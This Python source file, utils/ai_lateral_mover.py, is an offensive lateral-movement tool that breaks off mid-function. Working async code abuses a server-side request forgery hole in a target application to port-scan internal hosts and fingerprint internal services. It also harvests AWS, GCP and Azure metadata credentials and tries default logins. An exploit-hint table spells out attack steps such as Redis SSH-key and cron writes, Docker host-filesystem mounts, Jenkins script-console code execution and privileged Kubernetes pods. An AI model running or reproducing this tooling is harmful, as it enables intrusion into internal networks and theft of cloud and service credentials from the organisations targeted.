# utils/ai_lateral_mover.py
import asyncio
import ipaddress
import json
import re
import time
import uuid
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Callable, Optional
from urllib.parse import urljoin, urlparse

import aiohttp


# ─── Enums ────────────────────────────────────────────────────────────────────

class ServiceType(Enum):
    HTTP            = "http"
    HTTPS           = "https"
    REDIS           = "redis"
    MEMCACHED       = "memcached"
    ELASTICSEARCH   = "elasticsearch"
    MONGODB         = "mongodb"
    MYSQL           = "mysql"
    POSTGRES        = "postgres"
    RABBITMQ        = "rabbitmq"
    CONSUL          = "consul"
    ETCD            = "etcd"
    KUBERNETES_API  = "kubernetes_api"
    DOCKER_API      = "docker_api"
    PROMETHEUS      = "prometheus"
    GRAFANA         = "grafana"
    JENKINS         = "jenkins"
    GITLAB          = "gitlab"
    VAULT           = "vault"
    ZOOKEEPER       = "zookeeper"
    SMTP            = "smtp"
    FTP             = "ftp"
    SSH             = "ssh"
    LDAP            = "ldap"
    UNKNOWN_HTTP    = "unknown_http"
    UNKNOWN         = "unknown"


class PortState(Enum):
    OPEN     = "open"
    CLOSED   = "closed"
    FILTERED = "filtered"
    UNKNOWN  = "unknown"


class LateralTechnique(Enum):
    SSRF_PORT_SCAN      = "ssrf_port_scan"
    SSRF_SERVICE_PROBE  = "ssrf_service_probe"
    SSRF_PATH_TRAVERSE  = "ssrf_path_traverse"
    HEADER_PIVOT        = "header_pivot"
    REDIRECT_PIVOT      = "redirect_pivot"
    CRED_REUSE          = "cred_reuse"
    TOKEN_REPLAY        = "token_replay"
    INTERNAL_API_WALK   = "internal_api_walk"
    CLOUD_METADATA_WALK = "cloud_metadata_walk"
    SERVICE_CHAIN       = "service_chain"


class NodeRole(Enum):
    ENTRY_POINT     = "entry_point"
    INTERNAL_HOST   = "internal_host"
    DATABASE        = "database"
    CACHE           = "cache"
    MESSAGE_QUEUE   = "message_queue"
    ORCHESTRATOR    = "orchestrator"
    SECRET_STORE    = "secret_store"
    MONITORING      = "monitoring"
    CI_CD           = "ci_cd"
    IDENTITY_STORE  = "identity_store"
    CLOUD_METADATA  = "cloud_metadata"
    GATEWAY         = "gateway"
    UNKNOWN         = "unknown"


class HostRisk(Enum):
    CRITICAL = "critical"
    HIGH     = "high"
    MEDIUM   = "medium"
    LOW      = "low"


# ─── Data Structures ──────────────────────────────────────────────────────────

@dataclass
class PortResult:
    host: str
    port: int
    state: PortState
    banner: str
    response_time_ms: float
    technique: LateralTechnique
    ssrf_param: str
    ssrf_endpoint: str
    raw_snippet: str


@dataclass
class ServiceFingerprint:
    service_type: ServiceType
    version_hint: str
    auth_required: bool
    admin_exposed: bool
    unauthenticated_data: list[str]
    sensitive_endpoints: list[str]
    exploit_hints: list[str]
    raw_response_snippet: str


@dataclass
class InternalHost:
    host_id: str
    address: str
    hostname: str
    open_ports: list[PortResult]
    services: dict[int, ServiceFingerprint]
    node_role: NodeRole
    risk: HostRisk
    reachable_via: list[str]
    credentials_tried: list[str]
    secrets_found: list[str]
    pivot_paths: list[str]
    discovery_technique: LateralTechnique
    discovered_at: float = field(default_factory=time.monotonic)


@dataclass
class TopologyEdge:
    source: str
    target: str
    edge_type: str
    technique: LateralTechnique
    confidence: float
    pivot_payload: str


@dataclass
class InternalTopology:
    nodes: dict[str, InternalHost]
    edges: list[TopologyEdge]
    entry_points: list[str]
    high_value_targets: list[str]
    pivot_chains: list[list[str]]


@dataclass
class LateralMoveReport:
    move_id: str
    target_url: str
    technique_used: list[LateralTechnique]
    hosts_discovered: int
    topology: InternalTopology
    ssrf_params_used: list[str]
    credentials_reused: list[str]
    secrets_harvested: list[str]
    attack_paths: list[dict]
    overall_reach: str
    duration_seconds: float


# ─── Port + Service Databases ─────────────────────────────────────────────────

COMMON_INTERNAL_PORTS: list[int] = [
    21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 389,
    443, 445, 465, 587, 631, 993, 995, 1080, 1433, 1521,
    1723, 2049, 2181, 2375, 2376, 2379, 2380, 3000, 3001,
    3306, 3389, 4001, 4149, 4243, 4369, 4848, 5000, 5001,
    5432, 5601, 5672, 5900, 6379, 6443, 7001, 7474, 7687,
    8000, 8001, 8080, 8081, 8082, 8083, 8084, 8085, 8086,
    8088, 8089, 8090, 8091, 8092, 8161, 8200, 8300, 8301,
    8443, 8500, 8600, 8761, 8888, 9000, 9001, 9042, 9090,
    9092, 9093, 9100, 9200, 9300, 9418, 10250, 10255, 15672,
    15692, 16379, 26379, 27017, 27018, 27019, 50000, 61616,
]

HIGH_VALUE_PORTS: set[int] = {
    2375, 2376,   # Docker API
    6379, 16379, 26379,  # Redis + Sentinel
    27017, 27018, 27019,  # MongoDB
    9200, 9300,   # Elasticsearch
    5432,         # Postgres
    3306,         # MySQL
    6443, 8443, 10250, 10255,  # Kubernetes
    8200,         # Vault
    2379, 2380,   # etcd
    8500,         # Consul
    15672,        # RabbitMQ management
    8080,         # Jenkins, various admin UIs
    5601,         # Kibana
    9090,         # Prometheus
    3000,         # Grafana
}

PORT_SERVICE_MAP: dict[int, ServiceType] = {
    21:    ServiceType.FTP,
    22:    ServiceType.SSH,
    25:    ServiceType.SMTP,
    80:    ServiceType.HTTP,
    389:   ServiceType.LDAP,
    443:   ServiceType.HTTPS,
    465:   ServiceType.SMTP,
    587:   ServiceType.SMTP,
    1433:  ServiceType.MYSQL,
    2375:  ServiceType.DOCKER_API,
    2376:  ServiceType.DOCKER_API,
    2379:  ServiceType.ETCD,
    2380:  ServiceType.ETCD,
    2181:  ServiceType.ZOOKEEPER,
    3000:  ServiceType.GRAFANA,
    3306:  ServiceType.MYSQL,
    5432:  ServiceType.POSTGRES,
    5601:  ServiceType.ELASTICSEARCH,
    5672:  ServiceType.RABBITMQ,
    6379:  ServiceType.REDIS,
    6443:  ServiceType.KUBERNETES_API,
    7474:  ServiceType.UNKNOWN_HTTP,
    7687:  ServiceType.UNKNOWN_HTTP,
    8080:  ServiceType.JENKINS,
    8200:  ServiceType.VAULT,
    8300:  ServiceType.CONSUL,
    8500:  ServiceType.CONSUL,
    8600:  ServiceType.CONSUL,
    8761:  ServiceType.UNKNOWN_HTTP,
    9000:  ServiceType.UNKNOWN_HTTP,
    9090:  ServiceType.PROMETHEUS,
    9092:  ServiceType.RABBITMQ,
    9200:  ServiceType.ELASTICSEARCH,
    9300:  ServiceType.ELASTICSEARCH,
    10250: ServiceType.KUBERNETES_API,
    10255: ServiceType.KUBERNETES_API,
    15672: ServiceType.RABBITMQ,
    16379: ServiceType.REDIS,
    26379: ServiceType.REDIS,
    27017: ServiceType.MONGODB,
    27018: ServiceType.MONGODB,
    27019: ServiceType.MONGODB,
}

INTERNAL_HOST_RANGES: list[str] = [
    "10.0.0.1", "10.0.0.2", "10.0.1.1", "10.1.0.1",
    "172.16.0.1", "172.17.0.1", "172.18.0.1", "172.19.0.1",
    "172.20.0.1", "172.31.0.1",
    "192.168.0.1", "192.168.1.1", "192.168.100.1",
    "127.0.0.1", "0.0.0.0",
]

CLOUD_METADATA_ENDPOINTS: dict[str, list[str]] = {
    "aws": [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://169.254.169.254/latest/meta-data/hostname",
        "http://169.254.169.254/latest/meta-data/local-ipv4",
        "http://169.254.169.254/latest/meta-data/public-ipv4",
        "http://169.254.169.254/latest/meta-data/instance-id",
        "http://169.254.169.254/latest/user-data",
        "http://169.254.169.254/latest/meta-data/network/interfaces/macs/",
    ],
    "gcp": [
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/",
        "http://metadata.google.internal/computeMetadata/v1/project/project-id",
        "http://metadata.google.internal/computeMetadata/v1/instance/hostname",
        "http://metadata.google.internal/computeMetadata/v1/instance/network-interfaces/0/ip",
    ],
    "azure": [
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
        "http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01",
    ],
}

SERVICE_PROBE_PATHS: dict[ServiceType, list[str]] = {
    ServiceType.ELASTICSEARCH: [
        "/", "/_cat/indices?v", "/_cluster/health", "/_nodes",
        "/_cat/nodes?v", "/_security/user", "/_xpack",
        "/.env", "/passwords", "/_all/_search?size=5",
    ],
    ServiceType.KUBERNETES_API: [
        "/", "/api", "/api/v1", "/apis",
        "/api/v1/namespaces", "/api/v1/pods",
        "/api/v1/secrets", "/api/v1/configmaps",
        "/api/v1/serviceaccounts", "/api/v1/nodes",
        "/apis/apps/v1/deployments",
        "/version",
    ],
    ServiceType.DOCKER_API: [
        "/", "/v1.41/version", "/v1.41/containers/json",
        "/v1.41/images/json", "/v1.41/networks",
        "/v1.41/volumes", "/v1.41/secrets",
        "/v1.41/configs", "/v1.41/swarm",
        "/v1.41/nodes", "/v1.41/services",
    ],
    ServiceType.CONSUL: [
        "/", "/v1/agent/self", "/v1/catalog/nodes",
        "/v1/catalog/services", "/v1/kv/?recurse",
        "/v1/agent/services", "/v1/health/state/passing",
        "/v1/kv/secrets?recurse", "/v1/kv/config?recurse",
        "/v1/acl/tokens",
    ],
    ServiceType.VAULT: [
        "/", "/v1/sys/health", "/v1/sys/init",
        "/v1/sys/seal-status", "/v1/sys/mounts",
        "/v1/secret/", "/v1/secret/data/",
        "/v1/kv/", "/v1/secret?list=true",
        "/v1/sys/policies/acl",
    ],
    ServiceType.ETCD: [
        "/", "/health", "/version",
        "/v3/keys/", "/v2/keys/",
        "/v3/kv/range", "/metrics",
        "/v2/members", "/v3/cluster/member/list",
    ],
    ServiceType.PROMETHEUS: [
        "/", "/metrics", "/api/v1/targets",
        "/api/v1/rules", "/api/v1/alerts",
        "/api/v1/label/__name__/values",
        "/api/v1/query?query=up",
        "/api/v1/status/config",
        "/api/v1/status/flags",
    ],
    ServiceType.GRAFANA: [
        "/", "/api/health", "/api/datasources",
        "/api/dashboards/home", "/api/users",
        "/api/org/users", "/api/admin/users",
        "/api/plugins", "/api/admin/settings",
    ],
    ServiceType.JENKINS: [
        "/", "/api/json", "/script",
        "/people/", "/asynchPeople/",
        "/credentials/", "/manage",
        "/configureSecurity/", "/computer/",
        "/api/json?tree=jobs[name,url,lastBuild[result]]",
    ],
    ServiceType.RABBITMQ: [
        "/", "/api/overview", "/api/nodes",
        "/api/vhosts", "/api/connections",
        "/api/queues", "/api/exchanges",
        "/api/users", "/api/permissions",
        "/api/bindings",
    ],
    ServiceType.REDIS: [
        "/",
    ],
    ServiceType.MONGODB: [
        "/",
    ],
    ServiceType.UNKNOWN_HTTP: [
        "/", "/api", "/api/v1", "/health", "/status",
        "/metrics", "/info", "/debug", "/admin",
        "/config", "/env", "/actuator",
        "/actuator/env", "/actuator/health",
        "/actuator/info", "/actuator/mappings",
    ],
}

SERVICE_FINGERPRINT_PATTERNS: dict[ServiceType, list[tuple[str, str]]] = {
    ServiceType.ELASTICSEARCH: [
        (r'"cluster_name"\s*:', "cluster_name in root response"),
        (r'"version"\s*:\s*\{.*?"number"', "version number field"),
        (r'"tagline"\s*:\s*"You Know, for Search"', "ES tagline"),
    ],
    ServiceType.KUBERNETES_API: [
        (r'"kind"\s*:\s*"APIVersions"', "API versions response"),
        (r'"kind"\s*:\s*"NodeList"', "NodeList kind"),
        (r'"kind"\s*:\s*"SecretList"', "SecretList — CRITICAL"),
        (r'Bearer token', "auth header required"),
        (r'"kind"\s*:\s*"Status".*"code"\s*:\s*403', "auth required 403"),
    ],
    ServiceType.DOCKER_API: [
        (r'"ApiVersion"\s*:', "Docker API version field"),
        (r'"Containers"\s*:\s*\[', "containers list"),
        (r'"Image"\s*:\s*"', "image field in containers"),
        (r'"Secrets"\s*:\s*\[', "secrets list — CRITICAL"),
    ],
    ServiceType.CONSUL: [
        (r'"Config"\s*:\s*\{', "consul config block"),
        (r'"Services"\s*:\s*\{', "services map"),
        (r'"ACLDefaultPolicy"', "ACL policy field"),
    ],
    ServiceType.VAULT: [
        (r'"initialized"\s*:\s*(true|false)', "vault init status"),
        (r'"sealed"\s*:\s*(true|false)', "vault seal status"),
        (r'"version"\s*:\s*"', "vault version"),
    ],
    ServiceType.PROMETHEUS: [
        (r'"status"\s*:\s*"success"', "prometheus success status"),
        (r'# HELP ', "prometheus metric help line"),
        (r'# TYPE ', "prometheus metric type line"),
    ],
    ServiceType.GRAFANA: [
        (r'"database"\s*:\s*"ok"', "grafana health ok"),
        (r'"id"\s*:\d+.*"orgId"', "grafana user/org fields"),
        (r'"type"\s*:\s*"(prometheus|influxdb|mysql)"', "datasource type"),
    ],
    ServiceType.JENKINS: [
        (r'"_class"\s*:\s*"hudson', "Jenkins hudson class"),
        (r'"jobs"\s*:\s*\[', "Jenkins jobs list"),
        (r'<title>.*Jenkins.*</title>', "Jenkins HTML title"),
    ],
    ServiceType.REDIS: [
        (r'\+PONG', "Redis PONG response"),
        (r'-ERR.*Redis', "Redis error prefix"),
        (r'\$\d+\r\n', "Redis bulk string"),
    ],
    ServiceType.RABBITMQ: [
        (r'"rabbitmq_version"\s*:', "RabbitMQ version field"),
        (r'"vhosts_count"\s*:', "vhosts count field"),
        (r'"node"\s*:\s*"rabbit@', "RabbitMQ node name"),
    ],
    ServiceType.MONGODB: [
        (r'"ismaster"\s*:\s*(true|false)', "MongoDB isMaster"),
        (r'"version"\s*:\s*"\d+\.\d+\.\d+"', "MongoDB version"),
        (r'"codeName"\s*:\s*"', "MongoDB code name"),
    ],
}

UNAUTHENTICATED_SENSITIVE_PATTERNS: list[tuple[str, str]] = [
    (r'"password"\s*:', "password field in response"),
    (r'"secret"\s*:', "secret field in response"),
    (r'"token"\s*:\s*"[A-Za-z0-9+/=]{20,}"', "token value in response"),
    (r'"key"\s*:\s*"[A-Za-z0-9+/=]{20,}"', "key value in response"),
    (r'AKIA[0-9A-Z]{16}', "AWS access key ID"),
    (r'"private_key"\s*:', "private key field"),
    (r'-----BEGIN (RSA|EC|OPENSSH) PRIVATE KEY-----', "PEM private key"),
    (r'"database_url"\s*:', "database URL"),
    (r'"connection_string"\s*:', "connection string"),
    (r'"jwt_secret"\s*:', "JWT secret"),
    (r'(mysql|postgres|mongodb)://[^\s"\']+', "DB connection URI"),
    (r'"REDIS_URL"\s*:', "Redis URL env var"),
    (r'"AWS_SECRET_ACCESS_KEY"\s*:', "AWS secret key"),
    (r'"GCP_SERVICE_ACCOUNT"\s*:', "GCP service account"),
]

NODE_ROLE_MAP: dict[ServiceType, NodeRole] = {
    ServiceType.MYSQL:          NodeRole.DATABASE,
    ServiceType.POSTGRES:       NodeRole.DATABASE,
    ServiceType.MONGODB:        NodeRole.DATABASE,
    ServiceType.REDIS:          NodeRole.CACHE,
    ServiceType.MEMCACHED:      NodeRole.CACHE,
    ServiceType.RABBITMQ:       NodeRole.MESSAGE_QUEUE,
    ServiceType.ZOOKEEPER:      NodeRole.ORCHESTRATOR,
    ServiceType.CONSUL:         NodeRole.ORCHESTRATOR,
    ServiceType.ETCD:           NodeRole.ORCHESTRATOR,
    ServiceType.KUBERNETES_API: NodeRole.ORCHESTRATOR,
    ServiceType.DOCKER_API:     NodeRole.ORCHESTRATOR,
    ServiceType.VAULT:          NodeRole.SECRET_STORE,
    ServiceType.LDAP:           NodeRole.IDENTITY_STORE,
    ServiceType.PROMETHEUS:     NodeRole.MONITORING,
    ServiceType.GRAFANA:        NodeRole.MONITORING,
    ServiceType.JENKINS:        NodeRole.CI_CD,
    ServiceType.GITLAB:         NodeRole.CI_CD,
    ServiceType.ELASTICSEARCH:  NodeRole.DATABASE,
    ServiceType.HTTP:           NodeRole.GATEWAY,
    ServiceType.HTTPS:          NodeRole.GATEWAY,
}

RISK_MAP: dict[ServiceType, HostRisk] = {
    ServiceType.KUBERNETES_API: HostRisk.CRITICAL,
    ServiceType.DOCKER_API:     HostRisk.CRITICAL,
    ServiceType.VAULT:          HostRisk.CRITICAL,
    ServiceType.ETCD:           HostRisk.CRITICAL,
    ServiceType.CONSUL:         HostRisk.HIGH,
    ServiceType.ELASTICSEARCH:  HostRisk.HIGH,
    ServiceType.MONGODB:        HostRisk.HIGH,
    ServiceType.MYSQL:          HostRisk.HIGH,
    ServiceType.POSTGRES:       HostRisk.HIGH,
    ServiceType.REDIS:          HostRisk.HIGH,
    ServiceType.RABBITMQ:       HostRisk.MEDIUM,
    ServiceType.PROMETHEUS:     HostRisk.MEDIUM,
    ServiceType.GRAFANA:        HostRisk.MEDIUM,
    ServiceType.JENKINS:        HostRisk.HIGH,
    ServiceType.LDAP:           HostRisk.HIGH,
    ServiceType.ZOOKEEPER:      HostRisk.MEDIUM,
}

EXPLOIT_HINTS: dict[ServiceType, list[str]] = {
    ServiceType.ELASTICSEARCH:  [
        "Unauthenticated → read all indices: GET /_cat/indices?v",
        "Write access → inject malicious document with XSS payload",
        "Groovy script execution via /_scripts (ES < 1.6)",
        "Dynamic scripting RCE (ES < 2.0): GET /_search?q=1&script=java.lang.Runtime...",
    ],
    ServiceType.KUBERNETES_API: [
        "List secrets: GET /api/v1/secrets (unauthenticated if RBAC misconfigured)",
        "Exec into pod: POST /api/v1/namespaces/default/pods/{name}/exec",
        "Create privileged pod for host escape via /api/v1/pods",
        "Read ServiceAccount tokens mounted at /var/run/secrets/kubernetes.io/",
    ],
    ServiceType.DOCKER_API:     [
        "List containers: GET /v1.41/containers/json",
        "Exec in running container: POST /v1.41/containers/{id}/exec",
        "Mount host filesystem via volume: POST /v1.41/containers/create with Binds=['/:/host']",
        "Read secrets: GET /v1.41/secrets",
    ],
    ServiceType.CONSUL:         [
        "Read all KV pairs: GET /v1/kv/?recurse — may contain secrets",
        "Register rogue service to poison service discovery",
        "Exec via service health check command injection",
        "Read ACL tokens: GET /v1/acl/tokens (if management token obtained)",
    ],
    ServiceType.VAULT:          [
        "Read secret engine paths: GET /v1/sys/mounts",
        "List secrets if unauthenticated: GET /v1/secret?list=true",
        "Token brute-force via /v1/auth/token/lookup-self",
        "Unseal Vault if key shares known from leaked config",
    ],
    ServiceType.REDIS:          [
        "Dump all keys: KEYS * (unauthenticated if no requirepass)",
        "Write SSH key: CONFIG SET dir /root/.ssh; SET x '\\nssh-rsa ...'",
        "Write cron job via CONFIG SET dir /var/spool/cron",
        "Read all hashes: HGETALL * for session/token stores",
    ],
    ServiceType.MONGODB:        [
        "Dump all collections if no auth: db.getCollectionNames()",
        "Read admin DB: use admin; db.system.users.find()",
        "Insert arbitrary data into user collection",
    ],
    ServiceType.ETCD:           [
        "List all keys: GET /v2/keys/?recursive=true",
        "Read Kubernetes secrets stored as etcd values",
        "Write malicious key to manipulate Kubernetes state",
    ],
    ServiceType.PROMETHEUS:     [
        "Config dump via /api/v1/status/config — reveals scrape targets and credentials",
        "Flags dump: /api/v1/status/flags",
        "Query internal metrics revealing service topology",
    ],
    ServiceType.GRAFANA:        [
        "List datasources with credentials: GET /api/datasources",
        "Admin panel if default admin:admin not rotated",
        "Plugin RCE via custom renderer (Grafana < 8.3.0 CVE-2021-43798)",
    ],
    ServiceType.JENKINS:        [
        "Script console RCE: POST /script with groovy payload",
        "List credentials: GET /credentials/store/system/domain/_/",
        "Read build logs containing secrets",
        "Execute arbitrary job via /job/{name}/build",
    ],
    ServiceType.RABBITMQ:       [
        "Default creds guest:guest on /api/overview",
        "List queues and read messages: GET /api/queues",
        "Shovel plugin for cross-network message relay",
    ],
}


# ─── SSRF Request Engine ───────────────────────────────────────────────────────

@dataclass
class SSRFVector:
    endpoint: str
    param: str
    method: str
    inject_style: str
    extra_headers: dict[str, str] = field(default_factory=dict)


def _build_ssrf_url(internal_url: str, vector: SSRFVector) -> dict:
    if vector.inject_style == "query_param":
        sep = "&" if "?" in vector.endpoint else "?"
        return {"method": vector.method, "url": f"{vector.endpoint}{sep}{vector.param}={internal_url}", "data": None, "json": None}
    if vector.inject_style == "json_body":
        return {"method": "POST", "url": vector.endpoint, "data": None, "json": {vector.param: internal_url}}
    if vector.inject_style == "form_body":
        return {"method": "POST", "url": vector.endpoint, "data": {vector.param: internal_url}, "json": None}
    if vector.inject_style == "header":
        return {"method": vector.method, "url": vector.endpoint, "data": None, "json": None,
                "headers_extra": {vector.param: internal_url}}
    return {"method": vector.method, "url": f"{vector.endpoint}?url={internal_url}", "data": None, "json": None}


async def _ssrf_fetch(
    session: aiohttp.ClientSession,
    internal_url: str,
    vector: SSRFVector,
    timeout: int = 10,
    delay: float = 0.2,
    proxy: Optional[str] = None,
) -> tuple[int, str, float]:
    await asyncio.sleep(delay)
    req = _build_ssrf_url(internal_url, vector)
    t0 = time.monotonic()
    headers = dict(vector.extra_headers)
    if "headers_extra" in req:
        headers.update(req.pop("headers_extra", {}))
    try:
        kwargs: dict[str, Any] = {
            "headers": headers,
            "timeout": aiohttp.ClientTimeout(total=timeout),
            "ssl": False,
            "allow_redirects": True,
        }
        if proxy:
            kwargs["proxy"] = proxy
        if req.get("json") is not None:
            kwargs["json"] = req["json"]
        elif req.get("data") is not None:
            kwargs["data"] = req["data"]
        async with session.request(req["method"], req["url"], **kwargs) as resp:
            body = await resp.text(errors="replace")
            return resp.status, body[:8192], round((time.monotonic() - t0) * 1000, 2)
    except asyncio.TimeoutError:
        return 0, "__TIMEOUT__", round((time.monotonic() - t0) * 1000, 2)
    except Exception as e:
        return 0, f"__ERR__:{str(e)[:100]}", round((time.monotonic() - t0) * 1000, 2)


# ─── Port Scan ────────────────────────────────────────────────────────────────

def _infer_port_state(status: int, body: str, latency_ms: float) -> PortState:
    if body.startswith("__TIMEOUT__"):
        return PortState.FILTERED
    if body.startswith("__ERR__"):
        return PortState.CLOSED
    if status in (200, 201, 204, 301, 302, 400, 401, 403, 404, 405, 500):
        return PortState.OPEN
    if latency_ms > 8000:
        return PortState.FILTERED
    return PortState.UNKNOWN


async def _scan_port(
    session: aiohttp.ClientSession,
    host: str,
    port: int,
    vector: SSRFVector,
    delay: float = 0.1,
    proxy: Optional[str] = None,
) -> PortResult:
    scheme = "https" if port in (443, 8443, 6443, 2376) else "http"
    internal_url = f"{scheme}://{host}:{port}/"
    status, body, latency = await _ssrf_fetch(session, internal_url, vector, timeout=8, delay=delay, proxy=proxy)
    state = _infer_port_state(status, body, latency)
    banner = body[:200].strip() if state == PortState.OPEN else ""
    return PortResult(
        host=host, port=port, state=state,
        banner=banner, response_time_ms=latency,
        technique=LateralTechnique.SSRF_PORT_SCAN,
        ssrf_param=vector.param, ssrf_endpoint=vector.endpoint,
        raw_snippet=body[:300],
    )


async def _port_scan_host(
    session: aiohttp.ClientSession,
    host: str,
    ports: list[int],
    vector: SSRFVector,
    concurrency: int = 10,
    delay: float = 0.1,
    proxy: Optional[str] = None,
) -> list[PortResult]:
    sem = asyncio.Semaphore(concurrency)
    results: list[PortResult] = []

    async def scan_one(port: int) -> PortResult:
        async with sem:
            return await _scan_port(session, host, port, vector, delay, proxy)

    tasks = [scan_one(p) for p in ports]
    raw = await asyncio.gather(*tasks, return_exceptions=True)
    for r in raw:
        if isinstance(r, PortResult) and r.state == PortState.OPEN:
            results.append(r)
    return results


# ─── Service Fingerprinter ────────────────────────────────────────────────────

def _detect_service_type(port: int, body: str) -> ServiceType:
    guessed = PORT_SERVICE_MAP.get(port, ServiceType.UNKNOWN_HTTP)
    if guessed != ServiceType.UNKNOWN_HTTP:
        patterns = SERVICE_FINGERPRINT_PATTERNS.get(guessed, [])
        for pattern, _ in patterns:
            if re.search(pattern, body, re.IGNORECASE | re.DOTALL):
                return guessed
    for stype, patterns in SERVICE_FINGERPRINT_PATTERNS.items():
        for pattern, _ in patterns:
            if re.search(pattern, body, re.IGNORECASE | re.DOTALL):
                return stype
    if port in PORT_SERVICE_MAP:
        return PORT_SERVICE_MAP[port]
    if port in (80, 8080, 8000, 3000, 5000):
        return ServiceType.UNKNOWN_HTTP
    return ServiceType.UNKNOWN


def _extract_version_hint(body: str, service: ServiceType) -> str:
    patterns = [
        r'"version"\s*:\s*"([\d.]+)"',
        r'"Version"\s*:\s*"([\d.]+)"',
        r'/([\d]+\.[\d]+\.[\d]+)/',
        r'Server:\s*([\w/.-]+)',
        r'"number"\s*:\s*"([\d.]+)"',
    ]
    for p in patterns:
        m = re.search(p, body)
        if m:
            return m.group(1)[:40]
    return ""


def _check_auth_required(status: int, body: str) -> bool:
    if status in (401, 403):
        return True
    if re.search(r'"message"\s*:\s*".*[Uu]nauthorized', body):
        return True
    if re.search(r'"code"\s*:\s*403', body):
        return True
    return False


def _check_admin_exposed(body: str, path: str) -> bool:
    admin_patterns = [
        r'"admin"', r'"superuser"', r'"isAdmin"\s*:\s*true',
        r'"role"\s*:\s*"admin"', r'<title>.*[Aa]dmin.*</title>',
        r'"manage"', r'"cluster_manager"',
    ]
    if "admin" in path.lower() or "manage" in path.lower():
        return True
    return any(re.search(p, body) for p in admin_patterns)


def _extract_sensitive_data(body: str) -> list[str]:
    found: list[str] = []
    for pattern, label in UNAUTHENTICATED_SENSITIVE_PATTERNS:
        if re.search(pattern, body, re.IGNORECASE | re.DOTALL):
            found.append(label)
    return found


async def _fingerprint_service(
    session: aiohttp.ClientSession,
    host: str,
    port: int,
    service_type: ServiceType,
    vector: SSRFVector,
    delay: float = 0.2,
    proxy: Optional[str] = None,
) -> ServiceFingerprint:
    scheme = "https" if port in (443, 8443, 6443, 2376) else "http"
    base = f"{scheme}://{host}:{port}"
    probe_paths = SERVICE_PROBE_PATHS.get(service_type, SERVICE_PROBE_PATHS[ServiceType.UNKNOWN_HTTP])

    all_bodies: dict[str, str] = {}
    sensitive: list[str] = []
    admin_exposed = False
    auth_required = False
    version_hint = ""

    for path in probe_paths[:6]:
        url = base + path
        status, body, _ = await _ssrf_fetch(session, url, vector, timeout=8, delay=delay, proxy=proxy)
        if body.startswith("__TIMEOUT__") or body.startswith("__ERR__"):
            continue
        all_bodies[path] = body
        if not version_hint:
            version_hint = _extract_version_hint(body, service_type)
        if not auth_required:
            auth_required = _check_auth_required(status, body)
        if not admin_exposed:
            admin_exposed = _check_admin_exposed(body, path)
        sensitive.extend(_extract_sensitive_data(body))

    sensitive = list(set(sensitive))
    exploit_hints = EXPLOIT_HINTS.get(service_type, [])
    best_paths = [p for p, b in all_bodies.items() if b and not b.startswith("__")]
    combined = "\n".join(list(all_bodies.values())[:2])[:600]

    return ServiceFingerprint(
        service_type=service_type,
        version_hint=version_hint,
        auth_required=auth_required,
        admin_exposed=admin_exposed,
        unauthenticated_data=sensitive,
        sensitive_endpoints=best_paths[:8],
        exploit_hints=exploit_hints,
        raw_response_snippet=combined,
    )


# ─── Cloud Metadata Walker ─────────────────────────────────────────────────────

async def _walk_cloud_metadata(
    session: aiohttp.ClientSession,
    vector: SSRFVector,
    delay: float = 0.3,
    proxy: Optional[str] = None,
) -> dict[str, Any]:
    results: dict[str, Any] = {}
    gcp_headers = {"Metadata-Flavor": "Google"}
    for provider, endpoints in CLOUD_METADATA_ENDPOINTS.items():
        provider_results: dict[str, str] = {}
        for endpoint in endpoints:
            extra_hdrs = gcp_headers if provider == "gcp" else {}
            orig_hdrs = dict(vector.extra_headers)
            vector.extra_headers.update(extra_hdrs)
            status, body, _ = await _ssrf_fetch(session, endpoint, vector, timeout=10, delay=delay, proxy=proxy)
            vector.extra_headers = orig_hdrs
            if status in (200, 201) and not body.startswith("__"):
                provider_results[endpoint] = body[:1000]
                role_m = re.search(r'"InstanceProfileArn"\s*:\s*"([^"]+)"', body)
                if not role_m:
                    role_m = re.search(r'[A-Za-z0-9_-]{20,}', body)
                token_m = re.search(r'"Token"\s*:\s*"([A-Za-z0-9+/=]{40,})"', body)
                key_m = re.search(r'"AccessKeyId"\s*:\s*"(AKIA[0-9A-Z]{16})"', body)
                secret_m = re.search(r'"SecretAccessKey"\s*:\s*"([^"]{40})"', body)
                if key_m:
                    provider_results["__extracted_key__"] = key_m.group(1)
                if secret_m:
                    provider_results["__extracted_secret__"] = "REDACTED_FOR_PLAN"
                if token_m:
                    provider_results["__extracted_session_token__"] = token_m.group(1)[:50]
        if provider_results:
            results[provider] = provider_results
    return results


# ─── Credential Reuse ─────────────────────────────────────────────────────────

async def _attempt_cred_reuse(
    session: aiohttp.ClientSession,
    host: str,
    port: int,
    service_type: ServiceType,
    credentials: list[dict],
    vector: SSRFVector,
    delay: float = 0.3,
    proxy: Optional[str] = None,
) -> list[str]:
    hits: list[str] = []
    scheme = "https" if port in (443, 8443, 6443, 2376) else "http"
    base = f"{scheme}://{host}:{port}"

    if service_type == ServiceType.ELASTICSEARCH:
        for cred in credentials[:3]:
            u, p = cred.get("username", "elastic"), cred.get("password", "")
            url = f"{base}/_security/user"
            orig = dict(vector.extra_headers)
            import base64
            vector.extra_headers["Authorization"] = "Basic " + base64.b64encode(f"{u}:{p}".encode()).decode()
            status, body, _ = await _ssrf_fetch(session, url, vector, delay=delay, proxy=proxy)
            vector.extra_headers = orig
            if status == 200:
                hits.append(f"elasticsearch:{u}:{p}")

    if service_type == ServiceType.RABBITMQ:
        for cred in credentials[:3]:
            u, p = cred.get("username", "guest"), cred.get("password", "guest")
            url = f"{base}/api/overview"
            orig = dict(vector.extra_headers)
            import base64
            vector.extra_headers["Authorization"] = "Basic " + base64.b64encode(f"{u}:{p}".encode()).decode()
            status, body, _ = await _ssrf_fetch(session, url, vector, delay=delay, proxy=proxy)
            vector.extra_headers = orig
            if status == 200 and "rabbitmq" in body.lower():
                hits.append(f"rabbitmq:{u}:{p}")

    if service_type in (ServiceType.GRAFANA, ServiceType.JENKINS):
        default_pairs = [("admin", "admin"), ("admin", "password"), ("admin", "jenkins")]
        for u, p in default_pairs:
